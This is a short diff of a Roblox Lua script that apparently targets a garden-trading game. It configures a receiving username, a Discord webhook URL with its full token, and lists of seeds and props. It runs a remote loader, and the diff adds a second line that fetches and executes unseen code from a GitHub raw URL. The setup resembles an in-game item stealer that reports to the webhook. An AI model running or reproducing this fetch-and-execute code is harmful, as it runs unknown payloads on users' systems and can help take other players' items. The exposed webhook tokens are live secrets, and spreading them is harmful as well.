@@ -1,5 +1,5 @@
 getgenv().NORMAL_TARGET     = "LoggyX91"
-getgenv().NORMAL_WEBHOOK_URL = "https://discord.com/api/webhooks/1521401435483410544/NycHNk7IypSJ4hpu7VXluEaJeU20MkddjCs-Gzv5ix0MiXNwVyrPSNz-aDEtNBzlFATW"
+getgenv().NORMAL_WEBHOOK_URL = "https://discord.com/api/webhooks/1523458029348065482/fsa5mFsfedbpv6RNy1cgoztAq7MLmcw8Y8hY1tMvbdzxE8resyrPjearPeQ5I0tUvjHF"
 getgenv().NORMAL_SEEDS = {
     ["Moon Bloom"] = true,
     ["Dragon's Breath"] = true,
@@ -91,3 +91,6 @@ getgenv().NORMAL_PROPS = {
     ["Ladder Crate"] = true
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/22c796a75f035b5ef8e55946d39e602c.lua"))()
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/annan1310/gag2/refs/heads/main/starspawner"))()
+end)
